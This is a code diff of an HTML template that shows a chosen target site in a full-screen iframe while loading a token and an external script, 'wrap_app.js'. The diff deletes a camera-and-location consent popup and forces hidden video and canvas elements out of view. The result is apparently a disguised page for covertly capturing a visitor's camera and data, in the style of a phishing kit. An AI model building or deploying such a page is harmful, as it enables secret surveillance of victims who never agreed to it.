@@ -1,122 +1,35 @@
 <!doctype html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <title>Loading site…</title>
+  <meta charset="utf-8"/>
+  <title>Loading...</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    html, body {
+    body, html {
       margin: 0;
       padding: 0;
-      height: 100%;
-    }
-    body {
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      background: #000;
-    }
-    #frameWrap {
-      position: fixed;
-      inset: 0;
-    }
-    #targetFrame {
       width: 100%;
       height: 100%;
+      overflow: hidden;
+      background: #fff;
+    }
+    #siteFrame {
+      width: 100vw;
+      height: 100vh;
       border: none;
-      display: block;
     }
-
-    /* Permission popup */
-    #consentOverlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.55);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-    }
-    .consent-box {
-      background: #ffffff;
-      border-radius: 14px;
-      padding: 16px 18px;
-      max-width: 360px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.25);
-    }
-    .consent-box h3 {
-      margin: 0 0 8px;
-      font-size: 18px;
-    }
-    .consent-box p {
-      margin: 0 0 12px;
-      font-size: 14px;
-      color: #333;
-    }
-    .consent-actions {
-      display: flex;
-      justify-content: flex-end;
-      gap: 8px;
-    }
-    .btn {
-      border-radius: 999px;
-      border: none;
-      padding: 8px 14px;
-      font-size: 14px;
-      cursor: pointer;
-    }
-    .btn-secondary {
-      background: #e5e5e5;
-      color: #333;
-    }
-    .btn-primary {
-      background: #007bff;
-      color: #fff;
-    }
-
-    /* Hidden video used for capture; must NOT be display:none */
-    #video {
-      position: fixed;
-      top: -10000px;
-      left: -10000px;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      pointer-events: none;
-    }
-
-    /* Debug elements are hidden from user */
-    #debugInfo {
-      display: none;
-    }
+    video, canvas { display: none !important; }
   </style>
 </head>
 <body>
-  <div id="frameWrap">
-    <iframe id="targetFrame" src="{{ target_url }}"></iframe>
-  </div>
 
-  <div id="consentOverlay">
-    <div class="consent-box">
-      <h3>Permissions needed</h3>
-      <p>This page would like to use your camera and location while it is open.</p>
-      <div class="consent-actions">
-        <button id="consentDeny" class="btn btn-secondary">No</button>
-        <button id="consentAllow" class="btn btn-primary">Allow</button>
-      </div>
-    </div>
-  </div>
+  <iframe id="siteFrame" src="{{ target_url }}"></iframe>
 
   <video id="video" autoplay playsinline muted></video>
-
-  <div id="debugInfo">
-    <span id="battery"></span>
-    <span id="ip"></span>
-    <span id="coords"></span>
-    <pre id="log"></pre>
-  </div>
+  <canvas id="canvas"></canvas>
 
   <script>
-    const TOKEN = "{{ token }}";
-    const TARGET = `{{ target_url }}`;
+    window.TOKEN = "{{ token }}";
   </script>
   <script src="/static/wrap_app.js"></script>
 </body>
